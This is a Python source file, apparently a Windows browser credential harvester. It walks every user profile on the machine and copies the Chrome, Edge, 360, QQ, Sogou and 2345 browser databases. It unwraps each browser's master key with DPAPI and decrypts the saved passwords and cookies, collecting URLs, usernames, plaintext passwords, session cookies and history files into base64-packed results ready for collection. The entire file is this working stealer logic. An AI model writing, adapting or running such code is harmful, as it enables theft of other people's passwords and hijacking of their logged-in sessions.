# -*- coding: utf8 -*-
import sqlite3
import json, base64
import ctypes
import ctypes.wintypes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)
from win32crypt import CryptUnprotectData
import os
from shutil import copyfile
import datetime


class ChromeDecode():
    def __init__(self, ls_path):
        self.ls_path = ls_path

    def get_key_from_local_state(self):
        jsn = None
        with open(self.ls_path, encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]

    def decrypt(self, cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(self, key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    def dpapi_decrypt(self, encrypted):
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def aes_decrypt(self, encrypted_txt):
        encoded_key = self.get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = self.dpapi_decrypt(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = self.get_cipher(key)
        return self.decrypt(cipher, encrypted_txt[15:], nonce)

    def chrome_decrypt(self, encrypted_txt):
        try:
            if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                decrypted_txt = self.dpapi_decrypt(encrypted_txt)
                return decrypted_txt.decode()
            elif encrypted_txt[:3] == b'v10':
                decrypted_txt = self.aes_decrypt(encrypted_txt)
                return decrypted_txt[:-16].decode()
        except WindowsError:
            return None


class browsers():

    def date_from_webkit(self, webkit_timestamp):
        try:
            epoch_start = datetime.datetime(1601, 1, 1)
            delta = datetime.timedelta(microseconds=int(webkit_timestamp))
            return str(epoch_start + delta).split(".")[0]
        except:
            return '2020-02-02 00:00:00'
    def chrome_decode(self, encode_obj, LSP):
        try:
            chrome_d = ChromeDecode(LSP)
            decode_text = chrome_d.chrome_decrypt(encode_obj)
            if decode_text == None:
                decode_text = "null"
            return decode_text
        except Exception as e:
            print("error1", e)
            try:
                decode_text = CryptUnprotectData(encode_obj)[1].decode()
                if decode_text == None:
                    decode_text = "null"
                return decode_text
            except Exception as e:
                print("error2", e)
                return False

    def set_Cookies(self, browser, user):
        key = self.check_browser_obj(browser, user)
        if browser['CP'] == '':
            self.cookies_logins_result['data'][key]['Cookies'] = {
                'status': False,
                'msg': '被预设忽略',
                'type': '',
                'data': ''
            }
            return
        CP = browser['CP'].format(user)
        if os.path.exists(CP) == True:
            TCP = self.temp_path + r"\{}_{}_{}".format(user, browser['name'], 'C')
            try:
                copyfile(CP, TCP)
                current_info = {
                    'browser': browser['name'],
                    'type': 'CP'
                }
                if current_info not in self.must_file_list:
                    # 通过读数据
                    sql = "select host_key,name,encrypted_value,creation_utc from cookies"
                    cookie_list = []
                    with sqlite3.connect(TCP) as conn:
                        cu = conn.cursor()
                        select_cookie = (cu.execute(sql).fetchall())
                        for host_key, name, encrypted_value, creation_utc in select_cookie:
                            decode_cookie = self.chrome_decode(encrypted_value, browser['LSP'].format(user))
                            decode_cookie = base64.b64encode(str(decode_cookie).encode()).decode()
                            flag = False
                            for item in cookie_list:
                                if item['domain'] == host_key:
                                    flag = True
                                    item['cookies'] += "{}={};".format(name, decode_cookie)
                                    # if item['time'] < creation_utc:
                                    #     item['time'] = creation_utc
                                    self.date_from_webkit(creation_utc)
                            if flag == False:
                                cookie_list.append({
                                    'domain': host_key,
                                    'cookies': "{}={};".format(name, decode_cookie),
                                    'time': self.date_from_webkit(creation_utc)
                                })
                    self.cookies_logins_result['data'][key]['Cookies'] = {
                        'status': True,
                        'msg': '',
                        'type': 'json',
                        'data': cookie_list
                    }
                else:
                    with open(TCP, 'rb') as TCPF:
                        self.cookies_logins_result['data'][key]['Cookies'] = {
                            'status': True,
                            'msg': '',
                            'type': 'file',
                            'data': base64.b64encode(TCPF.read()).decode()
                        }
            except Exception as e:
                print("error", e)
                self.cookies_logins_result['data'][key]['Cookies'] = {
                    'status': False,
                    'msg': str(e),
                    'type': '',
                    'data': ''
                }

    def set_Login_Data(self, browser, user):
        key = self.check_browser_obj(browser, user)
        if browser['LDP'] == '':
            self.cookies_logins_result['data'][key]['Login_Data'] = {
                'status': False,
                'msg': '被预设忽略',
                'type': '',
                'data': ''
            }
            return
        LDP = browser['LDP'].format(user)
        if os.path.exists(LDP) == True:
            TLDP = self.temp_path + r"\{}_{}_{}".format(user, browser['name'], 'L')
            try:
                copyfile(LDP, TLDP)
                current_info = {
                    'browser': browser['name'],
                    'type': 'LDP'
                }
                if current_info not in self.must_file_list:
                    # 通过读数据
                    sql = 'SELECT origin_url,username_value,password_value,date_created FROM "logins"'
                    login_list = []
                    with sqlite3.connect(TLDP) as conn:
                        cu = conn.cursor()
                        select_cookie = (cu.execute(sql).fetchall())
                        for origin_url, username_value, password_value, date_created in select_cookie:
                            decode_password = self.chrome_decode(password_value, browser['LSP'].format(user))
                            login_list.append(
                                {
                                    'url': origin_url,
                                    'username': username_value,
                                    'password': decode_password,
                                    'time': self.date_from_webkit(date_created)
                                }
                            )
                    self.cookies_logins_result['data'][key]['Login_Data'] = {
                        'status': True,
                        'msg': '',
                        'type': 'json',
                        'data': login_list
                    }
                else:
                    with open(TLDP, 'rb') as TLDPF:
                        self.cookies_logins_result['data'][key]['Login_Data'] = {
                            'status': True,
                            'msg': '',
                            'type': 'file',
                            'data': base64.b64encode(TLDPF.read()).decode()
                        }
            except Exception as e:
                print("error", e)
                self.cookies_logins_result['data'][key]['Login_Data'] = {
                    'status': False,
                    'msg': str(e),
                    'type': '',
                    'data': ''
                }

    def set_History(self, browser, user):
        HP = browser['HP'].format(user)
        if browser['HP'] != '' and os.path.exists(HP) == True:
            THP = self.temp_path + r"\{}_{}_{}".format(user, browser['name'], 'H')
            try:
                copyfile(HP, THP)
                with open(THP, 'rb') as THPF:
                    self.histories_result['data'].append({
                        'user': user,
                        'browser': browser['name'],
                        'status': True,
                        'msg': '',
                        'type': 'file',
                        'data': base64.b64encode(THPF.read()).decode()
                    })
            except Exception as e:
                print("error", e)
                self.histories_result['data'].append({
                    'user': user,
                    'browser': browser['name'],
                    'status': False,
                    'msg': str(e),
                    'type': '',
                    'data': ''
                })

    def get_user_list(self):
        users_path = r"C:\Users"
        user_list = os.listdir(users_path)
        remove_list = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public', 'Applet', 'All Users', 'system']
        for r_item in remove_list:
            if r_item in user_list:
                user_list.remove(r_item)
        return user_list

    def check_browser_obj(self, browser, user):
        flag = False
        k = 0
        for key, item in enumerate(self.cookies_logins_result['data']):
            if item['user'] == user and item['browser'] == browser['name']:
                flag = True
                k = key
                break
        if flag == False:
            self.cookies_logins_result['data'].append({
                'user': user,
                'browser': browser['name'],
                'Login_Data': {},
                'Cookies': {}
            })
            k = len(self.cookies_logins_result['data']) - 1
        return k

    def clean(self):
        for key, item in enumerate(self.cookies_logins_result['data']):
            if len(item['Cookies'].keys()) == 0:
                del self.cookies_logins_result['data'][key]

    def __init__(self):
        ADP = r"C:\Users\{}\AppData\Roaming"
        LADP = r"C:\Users\{}\AppData\Local"
        self.temp_path = os.getenv('temp')
        self.user_list = self.get_user_list()
        if os.path.exists(self.temp_path) == False:
            os.makedirs(self.temp_path)
        self.must_file_list = [
            {
                'browser': '搜狗浏览器',
                'type': 'LDP'
            }
        ]
        self.browser_list = [
            {
                'name': 'Chrome',
                'LSP': LADP + r'\Google\Chrome\User Data\Local State',
                'LDP': LADP + r'\Google\Chrome\User Data\Default\Login Data',
                'CP': LADP + r'\Google\Chrome\User Data\Default\Cookies',
                'HP': LADP + r'\Google\Chrome\User Data\Default\History',
            },
            {
                'name': 'ChromeN',
                'LSP': LADP + r'\Google\Chrome\User Data\Local State',
                'LDP': LADP + r'\Google\Chrome\User Data\Profile 1\Login Data',
                'CP': LADP + r'\Google\Chrome\User Data\Profile 1\Cookies',
                'HP': LADP + r'\Google\Chrome\User Data\Profile 1\History',
            },
            {
                'name': '360极速浏览器',
                'LSP': LADP + r'\360Chrome\Chrome\User Data\Local State',
                'LDP': LADP + r'\360Chrome\Chrome\User Data\Default\Login Data',
                'CP': LADP + r'\360Chrome\Chrome\User Data\Default\Cookies',
                'HP': LADP + r'\360Chrome\Chrome\User Data\Default\History',
            },
            {
                'name': 'QQ浏览器',
                'LSP': LADP + r'\Tencent\QQBrowser\User Data\Local State',
                'LDP': LADP + r'\Tencent\QQBrowser\User Data\Default\Login Data',
                'CP': LADP + r'\Tencent\QQBrowser\User Data\Default\Cookies',
                'HP': LADP + r'\Tencent\QQBrowser\User Data\Default\History',
            },
            {
                'name': 'Microsoft Edge',
                'LSP': LADP + r'\Microsoft\Edge Beta\User Data\Local State',
                'LDP': LADP + r'\Microsoft\Edge Beta\User Data\Default\Login Data',
                'CP': LADP + r'\Microsoft\Edge Beta\User Data\Default\Cookies',
                'HP': LADP + r'\Microsoft\Edge Beta\User Data\Default\History',
            },
            {
                'name': '2345浏览器',
                'LSP': LADP + r'\2345Explorer\User Data\Local State',
                'LDP': '',
                'CP': LADP + r'\2345Explorer\User Data\Default\CookiesV3',
                'HP': LADP + r'\2345Explorer\User Data\Default\History',
            },
            {
                'name': '搜狗浏览器',
                'LSP': ADP + r'\SogouExplorer\Webkit\Local State',
                'LDP': ADP + r'\SogouExplorer\FormData3.dat',
                'CP': ADP + r'\SogouExplorer\Webkit\Default\Cookies',
                'HP': ADP + r'\SogouExplorer\uhistory3.db',
            },
            {
                'name': '360安全浏览器',
                'LSP': ADP + r'\360se6\User Data\Local State',
                'LDP': '',
                'CP': ADP + r'\360se6\User Data\Default\Cookies',
                'HP': ADP + r'\360se6\User Data\Default\History',
            },
        ]
        self.cookies_logins_result = {
            'status': True,
            'msg': '',
            'data': []
        }
        self.histories_result = {
            'status': True,
            'msg': '',
            'data': []
        }

    def get_cookies_logins(self):
        for user in self.user_list:
            for browser in self.browser_list:
                self.set_Cookies(browser, user)
                self.set_Login_Data(browser, user)
                self.clean()
        return self.cookies_logins_result

    def get_histories(self):
        for user in self.user_list:
            for browser in self.browser_list:
                self.set_History(browser, user)
        return self.histories_result
